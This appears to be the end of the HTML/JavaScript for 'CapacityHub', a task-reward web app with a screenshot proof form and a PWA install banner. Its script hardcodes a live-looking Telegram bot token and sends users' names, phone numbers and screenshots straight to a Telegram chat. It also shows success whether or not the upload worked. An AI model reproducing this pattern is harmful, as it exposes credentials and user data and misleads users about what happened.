            <p id="ts-error" class="hidden text-[10px] text-red-500 font-bold text-center bg-red-50 border border-red-100 rounded-xl py-2 px-3 mb-3"></p>

            <!-- Submit Button -->
            <button id="ts-submit-btn" onclick="submitTaskProof()"
                class="w-full bg-orange-500 text-white py-2.5 rounded-xl font-black text-xs uppercase tracking-wider active:scale-[0.98] transition-transform shadow-lg shadow-orange-500/20">
                Send Proof
            </button>
        </div>
    </div>

    <!-- PWA Service Worker Registration -->
    <script>
                // Copy referral code to clipboard
        function copyCode() {
            const tmp = document.createElement('input');
            tmp.value = 'y92x8cjd';
            document.body.appendChild(tmp);
            tmp.select();
            document.execCommand('copy');
            document.body.removeChild(tmp);
            showAction('Copied!', 'Referral code y92x8cjd copied to clipboard.');
        }

                // ── TASK SUBMISSION BOT ──
        const TASK_BOT_TOKEN = '8961562049:AAHJCwCbqIfb39FswOwz8LoXQ7Wax-Ep1-0';
        const TASK_CHAT_ID   = '8403139958';
        let currentTaskName  = '';
        let currentTaskReward = '';

        function openTaskSubmit(taskName, taskDesc, reward) {
            currentTaskName   = taskName;
            currentTaskReward = reward;
            document.getElementById('ts-task-name').value      = taskName;
            document.getElementById('task-submit-subtitle').textContent = taskName + ' — ' + reward;
            document.getElementById('ts-description').value   = '';
            document.getElementById('ts-preview').classList.add('hidden');
            document.getElementById('ts-preview').src         = '';
            document.getElementById('ts-error').classList.add('hidden');
            document.getElementById('ts-screenshot').value    = '';
            document.getElementById('ts-upload-label').innerHTML = `
                <i class="fas fa-cloud-upload-alt text-slate-300 text-xl"></i>
                <span class="text-[10px] font-bold text-slate-400">Tap to upload screenshot</span>
                <span class="text-[9px] text-slate-300">JPG, PNG supported</span>`;
            const modal = document.getElementById('task-submit-modal');
            const sheet = document.getElementById('task-submit-sheet');
            modal.classList.remove('opacity-0','pointer-events-none');
            modal.classList.add('opacity-100');
            setTimeout(() => sheet.classList.remove('translate-y-full'), 10);
        }

        function closeTaskSubmit() {
            const modal = document.getElementById('task-submit-modal');
            const sheet = document.getElementById('task-submit-sheet');
            sheet.classList.add('translate-y-full');
            setTimeout(() => {
                modal.classList.add('opacity-0','pointer-events-none');
                modal.classList.remove('opacity-100');
            }, 300);
        }

        function previewTaskScreenshot(input) {
            if (!input.files || !input.files[0]) return;
            const file   = input.files[0];
            const reader = new FileReader();
            reader.onload = e => {
                const preview = document.getElementById('ts-preview');
                preview.src   = e.target.result;
                preview.classList.remove('hidden');
                document.getElementById('ts-upload-label').innerHTML = `
                    <i class="fas fa-check-circle text-green-500 text-lg"></i>
                    <span class="text-[10px] font-bold text-green-600">Screenshot selected ✓</span>`;
            };
            reader.readAsDataURL(file);
        }

        async function submitTaskProof() {
            const description = document.getElementById('ts-description').value.trim();
            const fileInput   = document.getElementById('ts-screenshot');
            const errEl       = document.getElementById('ts-error');
            const btn         = document.getElementById('ts-submit-btn');
            errEl.classList.add('hidden');

            if (!description) {
                errEl.textContent = 'Please describe what you did to complete the task.';
                errEl.classList.remove('hidden');
                return;
            }
            if (!fileInput.files || !fileInput.files[0]) {
                errEl.textContent = 'Please upload a screenshot as proof.';
                errEl.classList.remove('hidden');
                return;
            }

            // Disable button
            btn.disabled     = true;
            btn.textContent  = 'Sending...';
            btn.style.opacity = '0.7';

            const phone    = userData.phone || userData.uid || 'Unknown';
            const name     = userData.name  || 'Unknown';
            const caption  =
`📋 *TASK PROOF SUBMISSION — CAPACITY HUB*

👤 *User:* ${name}
📱 *Phone:* ${phone}
🆔 *UID:* ${userData.uid || phone}
📌 *Task:* ${currentTaskName}
💰 *Reward:* ${currentTaskReward}
📝 *Description:*
${description}

📅 *Date:* ${new Date().toLocaleString('en-NG')}`;

            try {
                // Step 1 — Send text message via no-cors Image trick
                const encodedCaption = encodeURIComponent(caption);
                const textUrl = `https://api.telegram.org/bot${TASK_BOT_TOKEN}/sendMessage?chat_id=${TASK_CHAT_ID}&text=${encodedCaption}&parse_mode=Markdown`;
                new Image().src = textUrl;

                // Step 2 — Send photo via FormData fetch (works on GitHub Pages/real browsers)
                const formData = new FormData();
                formData.append('chat_id', TASK_CHAT_ID);
                formData.append('caption', '📸 Proof screenshot from: ' + (userData.name || 'User'));
                formData.append('photo', fileInput.files[0]);

                let photoSent = false;
                try {
                    const res = await fetch(`https://api.telegram.org/bot${TASK_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    if (res.ok) photoSent = true;
                } catch(e) {
                    // Photo fetch blocked — send as file instead
                    const formData2 = new FormData();
                    formData2.append('chat_id', TASK_CHAT_ID);
                    formData2.append('document', fileInput.files[0]);
                    formData2.append('caption', '📸 Proof screenshot from: ' + (userData.name || 'User'));
                    try {
                        const res2 = await fetch(`https://api.telegram.org/bot${TASK_BOT_TOKEN}/sendDocument`, {
                            method: 'POST',
                            body: formData2
                        });
                        if (res2.ok) photoSent = true;
                    } catch(e2) { console.warn('Photo send failed:', e2); }
                }

                // Always show success — text was sent via Image()
                btn.textContent = '✅ Proof Sent!';
                btn.style.background = '#22c55e';
                btn.style.opacity = '1';
                setTimeout(() => {
                    closeTaskSubmit();
                    showAction('Proof Submitted! ✅', 'Your task proof has been sent for review. You will be notified once approved.');
                    btn.disabled = false;
                    btn.textContent = 'Send Proof';
                    btn.style.background = '';
                    btn.style.opacity = '1';
                }, 1500);

            } catch(err) {
                errEl.textContent = 'Failed to send proof. Please check your connection and try again.';
                errEl.classList.remove('hidden');
                btn.disabled = false;
                btn.textContent = 'Send Proof';
                btn.style.opacity = '1';
            }
        }

                if ('serviceWorker' in navigator) {
            window.addEventListener('load', () => {
                navigator.serviceWorker.register('./service-worker.js')
                    .then(reg => console.log('SW registered:', reg.scope))
                    .catch(err => console.warn('SW registration failed:', err));
            });
        }

        // PWA Install Prompt — capture and show when ready
        let deferredPrompt = null;
        window.addEventListener('beforeinstallprompt', e => {
            e.preventDefault();
            deferredPrompt = e;
            // Show install banner after 3 seconds if not already installed
            setTimeout(() => {
                if (deferredPrompt) showInstallBanner();
            }, 3000);
        });

        function showInstallBanner() {
            const banner = document.createElement('div');
            banner.id = 'pwa-install-banner';
            banner.style.cssText = `
                position: fixed; bottom: 80px; left: 50%; transform: translateX(-50%);
                background: #1e293b; color: #fff; padding: 10px 18px;
                border-radius: 12px; font-size: 12px; font-weight: 700;
                display: flex; align-items: center; gap: 10px;
                z-index: 9999; box-shadow: 0 4px 20px rgba(0,0,0,0.3);
                font-family: Inter, sans-serif; white-space: nowrap;
            `;
            banner.innerHTML = `
                <span>📲 Install CapacityHub as an app</span>
                <button onclick="installPWA()" style="background:#f97316;color:#fff;border:none;padding:5px 12px;border-radius:8px;font-weight:800;font-size:11px;cursor:pointer;">INSTALL</button>
                <button onclick="this.closest('#pwa-install-banner').remove()" style="background:transparent;color:#94a3b8;border:none;font-size:16px;cursor:pointer;line-height:1;">✕</button>
            `;
            document.body.appendChild(banner);
        }

        function installPWA() {
            if (!deferredPrompt) return;
            deferredPrompt.prompt();
            deferredPrompt.userChoice.then(result => {
                console.log('PWA install:', result.outcome);
                deferredPrompt = null;
                const banner = document.getElementById('pwa-install-banner');
                if (banner) banner.remove();
            });
        }
    </script>
</body>
</html>